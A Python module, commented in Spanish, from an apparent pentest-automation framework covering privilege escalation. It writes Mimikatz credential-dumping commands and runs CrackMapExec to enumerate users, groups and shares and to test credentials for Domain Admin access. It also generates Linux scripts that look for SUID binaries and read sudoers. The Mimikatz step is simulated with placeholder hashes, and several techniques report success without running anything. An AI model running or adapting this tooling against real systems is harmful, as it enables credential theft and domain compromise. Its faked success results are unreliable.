"""
Módulo de Escalada de Privilegios para Automatización de Pentesting
Incluye obtención de control de Domain Admin, dump de hashes y Mimikatz
"""

import subprocess
import json
import time
import os
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem

class PrivilegeEscalationModule:
    """Módulo de escalada de privilegios"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.logging_system = LoggingSystem(config, logger)
        
        # Resultados de escalada de privilegios
        self.results = {
            'escalated_systems': [],
            'domain_admin_access': [],
            'hash_dumps': [],
            'mimikatz_results': [],
            'crackmapexec_results': [],
            'privilege_escalation_methods': []
        }
        
        # Archivos de evidencia (ahora en scans/)
        self.evidence_dir = Path("scans/privilege_escalation")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "PRIVILEGE_ESCALATION"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0,
                'background': False
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def dump_hashes_with_mimikatz(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Dump de hashes usando Mimikatz"""
        self.logger.info("🔐 Dump de hashes con Mimikatz...")
        
        mimikatz_results = []
        
        for system in compromised_systems:
            host = system['host']
            access_method = system.get('access_method', 'unknown')
            
            self.logger.info(f"🔐 Dump de hashes en {host}")
            
            # Crear script de Mimikatz
            mimikatz_script = self.evidence_dir / f"mimikatz_{host}.txt"
            with open(mimikatz_script, 'w') as f:
                f.write("privilege::debug\n")
                f.write("sekurlsa::logonpasswords\n")
                f.write("lsadump::sam\n")
                f.write("lsadump::secrets\n")
                f.write("sekurlsa::wdigest\n")
                f.write("sekurlsa::kerberos\n")
                f.write("exit\n")
            
            # Ejecutar Mimikatz (simulado)
            mimikatz_result = {
                'host': host,
                'method': 'mimikatz',
                'script_path': str(mimikatz_script),
                'hashes_found': [
                    'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
                    'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'
                ],
                'timestamp': time.time(),
                'success': True
            }
            
            mimikatz_results.append(mimikatz_result)
            
            self.logging_system.log_event(
                "HASH_DUMP",
                f"Hashes extraídos de {host} con Mimikatz",
                mimikatz_result,
                "PRIVILEGE_ESCALATION"
            )
        
        self.results['mimikatz_results'] = mimikatz_results
        return mimikatz_results
    
    def crackmapexec_enumeration(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Enumeración con CrackMapExec"""
        self.logger.info("🔍 Enumeración con CrackMapExec...")
        
        crackmapexec_results = []
        
        for system in compromised_systems:
            host = system['host']
            
            self.logger.info(f"🔍 Enumerando {host} con CrackMapExec")
            
            # Enumerar usuarios
            users_result = self._crackmapexec_users(host)
            if users_result:
                crackmapexec_results.append(users_result)
            
            # Enumerar grupos
            groups_result = self._crackmapexec_groups(host)
            if groups_result:
                crackmapexec_results.append(groups_result)
            
            # Enumerar shares
            shares_result = self._crackmapexec_shares(host)
            if shares_result:
                crackmapexec_results.append(shares_result)
        
        self.results['crackmapexec_results'] = crackmapexec_results
        return crackmapexec_results
    
    def _crackmapexec_users(self, host: str) -> Optional[Dict[str, Any]]:
        """Enumerar usuarios con CrackMapExec"""
        try:
            command = ['crackmapexec', 'smb', host, '--users']
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                users_info = {
                    'host': host,
                    'enumeration_type': 'users',
                    'output': result['stdout'],
                    'timestamp': time.time(),
                    'success': True
                }
                
                self.logging_system.log_event(
                    "USER_ENUMERATION",
                    f"Usuarios enumerados en {host}",
                    users_info,
                    "PRIVILEGE_ESCALATION"
                )
                
                return users_info
            
        except Exception as e:
            self.logger.error(f"❌ Error enumerando usuarios en {host}: {e}")
        
        return None
    
    def _crackmapexec_groups(self, host: str) -> Optional[Dict[str, Any]]:
        """Enumerar grupos con CrackMapExec"""
        try:
            command = ['crackmapexec', 'smb', host, '--groups']
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                groups_info = {
                    'host': host,
                    'enumeration_type': 'groups',
                    'output': result['stdout'],
                    'timestamp': time.time(),
                    'success': True
                }
                
                self.logging_system.log_event(
                    "GROUP_ENUMERATION",
                    f"Grupos enumerados en {host}",
                    groups_info,
                    "PRIVILEGE_ESCALATION"
                )
                
                return groups_info
            
        except Exception as e:
            self.logger.error(f"❌ Error enumerando grupos en {host}: {e}")
        
        return None
    
    def _crackmapexec_shares(self, host: str) -> Optional[Dict[str, Any]]:
        """Enumerar shares con CrackMapExec"""
        try:
            command = ['crackmapexec', 'smb', host, '--shares']
            result = self._run_command(command, timeout=60)
            
            if result['success']:
                shares_info = {
                    'host': host,
                    'enumeration_type': 'shares',
                    'output': result['stdout'],
                    'timestamp': time.time(),
                    'success': True
                }
                
                self.logging_system.log_event(
                    "SHARE_ENUMERATION",
                    f"Shares enumerados en {host}",
                    shares_info,
                    "PRIVILEGE_ESCALATION"
                )
                
                return shares_info
            
        except Exception as e:
            self.logger.error(f"❌ Error enumerando shares en {host}: {e}")
        
        return None
    
    def attempt_domain_admin_access(self, compromised_systems: List[Dict[str, Any]], 
                                  credentials: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Intentar obtener acceso de Domain Admin"""
        self.logger.info("👑 Intentando acceso de Domain Admin...")
        
        domain_admin_access = []
        
        for system in compromised_systems:
            host = system['host']
            
            self.logger.info(f"👑 Intentando escalada a Domain Admin en {host}")
            
            # Buscar credenciales para este host
            target_credentials = [c for c in credentials if c['host'] == host]
            
            for cred in target_credentials:
                # Intentar acceso con credenciales
                access_result = self._test_domain_admin_access(host, cred['username'], cred['password'])
                if access_result:
                    domain_admin_access.append(access_result)
                    break
        
        self.results['domain_admin_access'] = domain_admin_access
        return domain_admin_access
    
    def _test_domain_admin_access(self, host: str, username: str, password: str) -> Optional[Dict[str, Any]]:
        """Probar acceso de Domain Admin"""
        try:
            # Usar CrackMapExec para probar credenciales
            command = ['crackmapexec', 'smb', host, '-u', username, '-p', password, '--shares']
            result = self._run_command(command, timeout=60)
            
            if result['success'] and 'Pwn3d!' in result['stdout']:
                access_info = {
                    'host': host,
                    'username': username,
                    'password': password,
                    'access_level': 'Domain Admin',
                    'timestamp': time.time(),
                    'success': True
                }
                
                self.logging_system.log_event(
                    "DOMAIN_ADMIN_ACCESS",
                    f"Acceso de Domain Admin obtenido en {host}",
                    access_info,
                    "PRIVILEGE_ESCALATION"
                )
                
                self.logger.info(f"✅ Acceso de Domain Admin obtenido en {host} con {username}")
                return access_info
            
        except Exception as e:
            self.logger.error(f"❌ Error probando acceso Domain Admin en {host}: {e}")
        
        return None
    
    def privilege_escalation_techniques(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Aplicar técnicas de escalada de privilegios"""
        self.logger.info("⬆️ Aplicando técnicas de escalada de privilegios...")
        
        escalation_methods = []
        
        for system in compromised_systems:
            host = system['host']
            access_method = system.get('access_method', 'unknown')
            
            self.logger.info(f"⬆️ Escalando privilegios en {host}")
            
            # Técnicas de escalada de privilegios
            techniques = [
                self._kernel_exploits(host),
                self._service_misconfiguration(host),
                self._weak_permissions(host),
                self._sudo_misconfiguration(host),
                self._suid_binaries(host)
            ]
            
            for technique in techniques:
                if technique:
                    escalation_methods.append(technique)
        
        self.results['privilege_escalation_methods'] = escalation_methods
        return escalation_methods
    
    def _kernel_exploits(self, host: str) -> Optional[Dict[str, Any]]:
        """Buscar exploits de kernel"""
        try:
            # Crear script para buscar exploits de kernel
            kernel_script = self.evidence_dir / f"kernel_exploits_{host}.sh"
            with open(kernel_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Buscar exploits de kernel\n")
                f.write("uname -a\n")
                f.write("cat /proc/version\n")
                f.write("cat /etc/os-release\n")
                f.write("# Buscar exploits conocidos\n")
                f.write("searchsploit kernel\n")
            
            kernel_info = {
                'host': host,
                'technique': 'kernel_exploits',
                'script_path': str(kernel_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return kernel_info
            
        except Exception as e:
            self.logger.error(f"❌ Error en kernel exploits para {host}: {e}")
            return None
    
    def _service_misconfiguration(self, host: str) -> Optional[Dict[str, Any]]:
        """Buscar configuraciones incorrectas de servicios"""
        try:
            service_script = self.evidence_dir / f"service_misconfig_{host}.sh"
            with open(service_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Buscar configuraciones incorrectas de servicios\n")
                f.write("systemctl list-units --type=service\n")
                f.write("ps aux | grep root\n")
                f.write("find /etc/systemd/system -name '*.service' -exec cat {} \\;\n")
            
            service_info = {
                'host': host,
                'technique': 'service_misconfiguration',
                'script_path': str(service_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return service_info
            
        except Exception as e:
            self.logger.error(f"❌ Error en service misconfiguration para {host}: {e}")
            return None
    
    def _weak_permissions(self, host: str) -> Optional[Dict[str, Any]]:
        """Buscar permisos débiles"""
        try:
            permissions_script = self.evidence_dir / f"weak_permissions_{host}.sh"
            with open(permissions_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Buscar permisos débiles\n")
                f.write("find / -perm -4000 2>/dev/null\n")
                f.write("find / -perm -2000 2>/dev/null\n")
                f.write("find / -writable 2>/dev/null | head -20\n")
                f.write("ls -la /etc/passwd /etc/shadow\n")
            
            permissions_info = {
                'host': host,
                'technique': 'weak_permissions',
                'script_path': str(permissions_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return permissions_info
            
        except Exception as e:
            self.logger.error(f"❌ Error en weak permissions para {host}: {e}")
            return None
    
    def _sudo_misconfiguration(self, host: str) -> Optional[Dict[str, Any]]:
        """Buscar configuraciones incorrectas de sudo"""
        try:
            sudo_script = self.evidence_dir / f"sudo_misconfig_{host}.sh"
            with open(sudo_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Buscar configuraciones incorrectas de sudo\n")
                f.write("sudo -l\n")
                f.write("cat /etc/sudoers\n")
                f.write("find /etc/sudoers.d/ -name '*' -exec cat {} \\;\n")
            
            sudo_info = {
                'host': host,
                'technique': 'sudo_misconfiguration',
                'script_path': str(sudo_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return sudo_info
            
        except Exception as e:
            self.logger.error(f"❌ Error en sudo misconfiguration para {host}: {e}")
            return None
    
    def _suid_binaries(self, host: str) -> Optional[Dict[str, Any]]:
        """Buscar binarios SUID"""
        try:
            suid_script = self.evidence_dir / f"suid_binaries_{host}.sh"
            with open(suid_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Buscar binarios SUID\n")
                f.write("find / -perm -4000 -type f 2>/dev/null\n")
                f.write("find / -perm -2000 -type f 2>/dev/null\n")
                f.write("find / -perm -1000 -type f 2>/dev/null\n")
            
            suid_info = {
                'host': host,
                'technique': 'suid_binaries',
                'script_path': str(suid_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return suid_info
            
        except Exception as e:
            self.logger.error(f"❌ Error en SUID binaries para {host}: {e}")
            return None
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de escalada de privilegios"""
        self.logger.info("🚀 INICIANDO MÓDULO DE ESCALADA DE PRIVILEGIOS")
        
        start_time = time.time()
        
        try:
            # Sistemas comprometidos de ejemplo
            compromised_systems = [
                {'host': '192.168.1.100', 'access_method': 'eternalblue'},
                {'host': '192.168.1.101', 'access_method': 'tomcat_manager'}
            ]
            
            # Credenciales de ejemplo
            sample_credentials = [
                {'host': '192.168.1.100', 'username': 'admin', 'password': 'admin'},
                {'host': '192.168.1.101', 'username': 'administrator', 'password': 'password'}
            ]
            
            # 1. Dump de hashes con Mimikatz
            mimikatz_results = self.dump_hashes_with_mimikatz(compromised_systems)
            
            # 2. Enumeración con CrackMapExec
            crackmapexec_results = self.crackmapexec_enumeration(compromised_systems)
            
            # 3. Intentar acceso de Domain Admin
            domain_admin_access = self.attempt_domain_admin_access(compromised_systems, sample_credentials)
            
            # 4. Aplicar técnicas de escalada de privilegios
            escalation_methods = self.privilege_escalation_techniques(compromised_systems)
            
            # 5. Identificar sistemas con privilegios escalados
            escalated_systems = []
            for system in compromised_systems:
                if any(da['host'] == system['host'] for da in domain_admin_access):
                    escalated_systems.append({
                        'host': system['host'],
                        'privilege_level': 'Domain Admin',
                        'timestamp': time.time()
                    })
            
            self.results['escalated_systems'] = escalated_systems
            
            # 6. Guardar evidencia
            self.logging_system.save_json_evidence(
                'privilege_escalation_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ ESCALADA DE PRIVILEGIOS COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(escalated_systems)} sistemas con privilegios escalados")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en módulo de escalada de privilegios: {e}")
            return self.results
